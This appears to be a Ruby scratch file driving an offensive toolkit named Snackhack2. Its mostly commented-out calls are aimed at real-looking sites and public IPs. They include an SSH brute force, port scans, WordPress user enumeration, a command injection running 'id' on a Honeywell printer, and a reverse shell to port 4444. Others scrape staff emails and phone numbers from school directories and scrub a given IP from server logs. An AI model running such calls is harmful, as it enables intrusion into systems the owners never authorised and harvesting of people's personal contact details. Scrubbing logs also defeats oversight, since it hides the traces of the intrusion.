# frozen_string_literal: true

# require 'nokogiri'
# require 'open-uri'
require './lib/snackHack2'

# tags = document.xpath("//a")
# tags.each do |t|
#   puts t[:href]
# end

# Banner Grabber
# s = Snackhack2::BannerGrabber.new("https://google.com")
# s.curl

### Word Press#
# wp = Snackhack2::WordPress.new("https://www.piemonteinnova.it/")
# wp.wp_log
# ["https://google.com", "https://kinsta.com", "https://porchlightshop.com", "https://www.drrajatgupta.com"].each do |site|
#   wp = Snackhack2::WordPress.new(site)
#   puts "#{site}: "
#   wp.run
#   puts "\n"
# end
#

## Port Scan

# tcp = Snackhack2::PortScan.new("167.71.98.134")
# tcp.run

### Robots
# ip = Snackhack2::Robots.new("https://google.com", save_file: true)
# puts ip.run

## Get subdomain

# sd = Snackhack2::Subdomains.new("https://ruby-lang.org")
#
# sd.run

## SSH brute force

# Snackhack2::SSHBute.new("167.98.80.8").run

## Get a site's meta data



## Grab gooogle Analytics from a site. this could be used to find similar sites

# t = Snackhack2::GoogleAnalytics.new("https://training.vib.be/drupal/login")

# t.run

## Extract a bunch of different types of crypto addresses from a site.

# ca = Snackhack2::CryptoExtractWebsite.new("https://google.com")
# puts ca.save_file
# ca.save_file = false
# ca.run

## Detect the chances of the site being wordpress.
# wp = Snackhack2::WordPress.new("https://themeisle.com")
# wp.save_file = false
# wp.users

## Get all the links of a site.

# links = Snackhack2::WebsiteLinks.new('https://www.drrajatgupta.com/wp-content/uploads/')
# links.run

## Remove all the occurrences of the given IP and replaces it with an random IP.

# Snackhack2::WebServerCleaner.new('83.149.9.216').run

# ga = Snackhack2::GoogleAnalytics.new("https://g-form.com")
# ga.run

# ["https://google.com", "https://kinsta.com", "https://porchlightshop.com", "https://www.drrajatgupta.com"].each do |site|
#   s = Snackhack2::BannerGrabber.new(site)
#   puts s.curl
# end
# Snackhack2::read_serverversion
# Snackhack2::clean_serverversion

# Snackhack2::IpLookup.new("https://google.com").run
# wp = Snackhack2::GoogleAnalytics.new("https://www.drrajatgupta.com").run

# ca = Snackhack2::CryptoExtractWebsite.new('https://www.revuo-xmr.com/weekly/issue-201')
# ca.save_file = falseputs
# ca.run

# wp = Snackhack2::WPForoForum.new("http://www.example.com")
# wp.run

# wp = Snackhack2::PhoneNumber.new('https://pohs.grcsu.org/staff-directory/')
# wp.spider
=begin
e = Snackhack2::Email.new("https://www.tupeloschools.com/leadership/staff-directory")
puts e.max_depth
e.max_depth = 2
puts e.max_depth
=end

# d = Snackhack2::Drupal.new("https://physiologycore.umn.edu/")
# d.all
=begin
wp = Snackhack2::WordPress.new("https://adk.org")
wp.all_in_one_seo

=end

# Snackhack2::BannerGrabber.new("http://95.142.29.235").apache2
=begin
s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")

s.command = "id"
puts s.command
s.run
=end
# sm = Snackhack2::SiteMap.new("https://cryptogrinders.us")
# tc = Snackhack2::TomCat.new("https://recrutements-ec.univ-lille.fr")
# tc.run
=begin
ss = Snackhack2::ScreenShot.new
ss.zip = "test.zip"
ss.run
# Snackhack2::brute_force("https://netflix.com")
=end
# 
=begin
cj = Snackhack2::CommandInjection.new
cj.prompt = "test"
cj.wlrmdr_With_prompt
=end

=begin
dd
=end
=begin
tcp = Snackhack2::PortScan.new
tcp.count = 2
tcp.test
=end
=begin
ga = Snackhack2::GoogleAnalytics.new
ga.site = "https://hackex.net"
ga.run
=end

=begin
wp = Snackhack2::WordPress.new
wp.site = "https://themeisle.com"
wp.users
=end
=begin
s = Snackhack2::IpLookup.new
s.site = "https://hackex.net"
s.run

rs = Snackhack2::ReverseShell.new
rs.ip = "1270.0.01"
rs.port = "4444"
rs.run
=end
cew = Snackhack2::CryptoExtractWebsite.new("https://encodebase64.us", save_file: true)
cew.run